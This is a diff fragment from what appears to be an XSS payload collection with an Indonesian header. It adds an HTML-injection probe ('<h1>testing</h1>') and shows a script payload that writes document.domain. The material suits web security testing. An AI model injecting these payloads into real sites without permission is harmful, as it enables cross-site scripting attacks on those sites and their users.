@@ -3,6 +3,10 @@
 PAYLOAD INI DIDAPATKAN DARI BERBAGAI SUMBER YANG DITEMUKAN OLEH PENULIS
 TOLONG DOAKAN PENULIS DAN PEMILIK PAYLOAD YANG PENULIS DAPATKAN DARI SUMBER MANAPUN, 
 SEMOGA BERKAH DAN MEMBAWA MANFAAT SELALU
+
+
+
+<h1>testing</h1> ----> try this html tag first (if platform vulnerable with html injection, it has possibility to XSS Vulnerbility)
 -----------------------------------------------------------------------
 
 <script>document.write(document.domain)</script>
